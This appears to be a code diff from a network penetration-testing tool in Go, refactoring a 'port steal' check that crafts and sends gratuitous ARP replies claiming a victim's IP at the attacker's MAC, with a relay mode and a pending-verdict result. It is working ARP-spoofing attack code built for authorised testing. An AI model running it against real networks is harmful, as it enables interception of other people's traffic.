@@ -20,7 +20,7 @@ import (
 	"go.aledante.io/FlowSeer/src/common/errs"
 
 	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
-	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
+	"go.aledante.io/FlowSeer/src/edge/netpen/check"
 )
 
 type portStealFinding struct {
@@ -29,17 +29,20 @@ type portStealFinding struct {
 	Restore string `json:"restore"`
 }
 
-// RunPortSteal sends gratuitous ARP replies to steal traffic. In --relay
-// mode, it arms an ip_forward restore step (temporary-restored).
-func RunPortSteal(ctx context.Context, deps runner.Deps) error {
-	src := srcMAC(deps)
-	mode := deps.Entry.Mode
-
-	target := "10.0.0.1"
+// RunPortSteal sends three gratuitous ARP replies claiming the target's
+// victim IP at the attack leg's MAC. The relay mode arms an ip_forward
+// restore step that does no host work yet. The verdict is pending: whether
+// the switch moved the victim's port needs a probe that phase 2 adds.
+func RunPortSteal(ctx context.Context, deps check.Deps) (check.Verdict, error) {
+	if err := deps.Target.Need(check.FieldVictim); err != nil {
+		return check.Verdict{}, err
+	}
+	src := deps.AttackLeg.Addr().MAC
+	target := deps.Target.Victim.IP
 
 	frameCount := 3
 	restoreArmed := "no"
-	if mode == "relay" {
+	if deps.Entry.Restore.Kind == check.RestoreActive {
 		deps.Teardown.Arm("ip-forward-restore", func(_ context.Context) error {
 			// Restoring the original ip_forward sysctl value is host-side
 			// state with no wire effect; the in-memory harness observes the
@@ -52,26 +55,29 @@ func RunPortSteal(ctx context.Context, deps runner.Deps) error {
 	for i := 0; i < frameCount; i++ {
 		pkt, err := craftPortStealARP(src, target)
 		if err != nil {
-			return errs.Wrapf(err, "portsteal: craft frame %d", i)
+			return check.Verdict{}, errs.Wrapf(err, "portsteal: craft frame %d", i)
 		}
 		if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
-			return errs.Wrapf(err, "portsteal: send frame %d", i)
+			return check.Verdict{}, errs.Wrapf(err, "portsteal: send frame %d", i)
 		}
 	}
 
 	detail, _ := json.Marshal(portStealFinding{
 		Action:  "port-steal",
-		Target:  target,
+		Target:  target.String(),
 		Restore: restoreArmed,
 	})
 	deps.Emitter.Finding("arp", detail)
 
-	return nil
+	if restoreArmed == "yes" {
+		return check.Pending("no observable: port move needs a probe of the victim, and the ip-forward-restore step is a no-op"), nil
+	}
+	return check.Pending("no observable: port move needs a probe of the victim"), nil
 }
 
 // craftPortStealARP builds a gratuitous ARP reply: the attacker announces
 // the target's IP with the attacker's MAC.
-func craftPortStealARP(src net.HardwareAddr, _ string) ([]byte, error) {
+func craftPortStealARP(src net.HardwareAddr, target net.IP) ([]byte, error) {
 	eth := &layers.Ethernet{
 		DstMAC:       broadcastMAC,
 		SrcMAC:       src,
@@ -84,9 +90,9 @@ func craftPortStealARP(src net.HardwareAddr, _ string) ([]byte, error) {
 		ProtAddressSize:   4,
 		Operation:         2, // ARP reply
 		SourceHwAddress:   src,
-		SourceProtAddress: net.IPv4(10, 0, 0, 1),
+		SourceProtAddress: target.To4(),
 		DstHwAddress:      broadcastMAC,
-		DstProtAddress:    net.IPv4(10, 0, 0, 1),
+		DstProtAddress:    target.To4(),
 	}
 	return craft.Default(eth, arp)
 }
